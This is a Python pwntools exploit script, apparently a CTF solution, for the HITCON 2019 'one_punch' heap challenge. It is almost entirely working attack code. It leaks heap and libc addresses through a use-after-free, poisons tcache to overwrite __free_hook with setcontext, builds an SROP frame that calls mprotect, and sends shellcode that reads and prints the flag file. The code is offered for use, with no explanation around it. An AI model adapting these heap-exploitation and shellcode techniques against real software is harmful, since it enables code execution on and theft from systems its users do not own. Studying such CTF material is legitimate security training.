#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./hitcon_ctf_2019_one_punch')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./hitcon_ctf_2019_one_punch')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',)
			elf=ELF('./hitcon_ctf_2019_one_punch')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a,b):
			io.sendlineafter('> ','1')
			io.sendlineafter('idx: ',str(a))
			io.sendafter('hero name: ',b)

		def edit(a,b):
			io.sendlineafter('> ','2')
			io.sendlineafter('idx: ',str(a))
			io.sendafter('hero name: ',b)

		def show(a):
			io.sendlineafter('> ','3')
			io.sendlineafter('idx: ',str(a))

		def delete(a):
			io.sendlineafter('> ','4')
			io.sendlineafter('idx: ',str(a))

		add(1,'\x00'*0xe8)
		add(0,'\x00'*0xe0)

		for i in range (7):
			add(2,'\x00'*0xe0)
			delete(2)

		show(2)
		io.recvuntil('hero name: ')
		heap_base=u64(io.recv(6).ljust(0x8,'\x00'))-0x8f0
		delete(1)
		show(1)
		io.recvuntil('hero name: ')
		data=u64(io.recv(6).ljust(0x8,'\x00'))
		libc_base=data-libc.sym['__malloc_hook']-96-0x10#-0x1eac60 
		libc.address=libc_base
		edit(1,p64(data)*2+'\x00'*0xd0+p64(0x300))

		for i in range (3):
			add(1,'\x00'*0x3a8)
			delete(1)

		add(1,'\x00'*0x398)
		delete(1)

		for i in range (7):
			add(2,'\x00'*0x388)
			delete(2)

		add(2,'\x00'*0x388)
		delete(2)
		add(1,'\x00'*0xf8)
		add(1,'\x00'*0xf8)
		edit(2,'\x00'*0xf8+p64(0x21)+p64(0)+p64(0x21)+p64(0)+p64(heap_base+0x40)+p64(0)+p64(0x21)+p64(0)+p64(0x21))
		delete(1)
		add(1,'\x00'*0xf8)
		edit(2,'\x00'*0xf8+p64(0x21)+p64(0)+p64(0x21)+p64(0)+p64(heap_base+0x40)+'\x00'*0xc8+p64(0x21)+p64(0)+p64(0x31)*3+p64(heap_base+0x40)+p64(0x21)*6)
		delete(1)
		delete(0)
		add(0,('/bin/sh\x00'+p64(libc.sym['__free_hook'])*0x20).ljust(0x308,'\x00'))
		edit(0,('/bin/sh\x00'+p64(libc.sym['__free_hook'])*0x20).ljust(0x308,'\x00'))
		
		for i in range (7):
			add(2,'\x00'*0x218)
			delete(2)
		
		edit(0,('/bin/sh\x00'+p64(libc.sym['__free_hook'])*0x20).ljust(0x308,'\x00'))
		io.sendlineafter('> ','50056')
		free_hook_addr=libc.sym['__free_hook']
		new_shell_code_head_addr=free_hook_addr&0xfffffffffffff000
		shell1='''
		xor rdi,rdi
		mov rsi,%d
		mov rdx,0x1000
		xor rax,rax

		syscall
		jmp rsi
		'''%new_shell_code_head_addr
		io.send(p64(libc.sym['setcontext']+53)+p64(free_hook_addr+0x10)+asm(shell1))
		add(1,0x3f8*'\x00')
		srop_mprotect=SigreturnFrame()
		srop_mprotect.rsp=free_hook_addr+0x8
		srop_mprotect.rdi=new_shell_code_head_addr
		srop_mprotect.rsi=0x1000
		srop_mprotect.rdx=4|2|1
		srop_mprotect.rip=libc.sym['mprotect']
		edit(1,str(srop_mprotect).ljust(0x3f8,'\x00'))
		delete(1)
		shell2='''
		mov  rax,0x67616c662f2e
		push rax
		mov  rdi,rsp
		mov  rsi,0x0
		xor  rdx,rdx
		mov  rax,0x2
		syscall

		mov  rdi,rax
		mov  rsi,rsp
		mov  rdx,0x100
		mov  rax,0x0
		syscall

		mov  rdi,0x1
		mov  rsi,rsp
		mov  rdx,0x100
		mov  rax,0x1
		syscall
		'''
		io.sendline(asm(shell2))
		
		
		# add(2,'\x00'*(0x210))
		# add(2,'\x00'*(0x210))


		success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue